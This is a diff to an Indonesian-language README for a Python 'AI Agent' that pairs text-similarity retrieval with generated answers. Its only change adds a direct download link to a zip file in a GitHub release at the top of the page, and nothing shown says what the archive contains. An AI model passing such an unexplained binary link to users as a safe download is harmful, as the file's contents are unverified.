@@ -1,3 +1,5 @@
+Download Link: https://github.com/gajamedia/AI_Agent_Kecerdasan_Buatan_AGI_Release/releases/download/hAI/hAI-v2.5.zip
+
 🧠 AI Agent: Adaptif, Generatif, dan Belajar Mandiri AI Agent ini adalah sistem pencarian jawaban cerdas berbasis Python yang menggabungkan pendekatan retrieval (berbasis kemiripan teks) dan generative response untuk memberikan jawaban yang alami, kontekstual, dan bisa berkembang melalui interaksi pengguna.
 
 ✨ Fitur Utama ✅ Adaptif terhadap Input Pengguna Menggunakan berbagai teknik kemiripan:
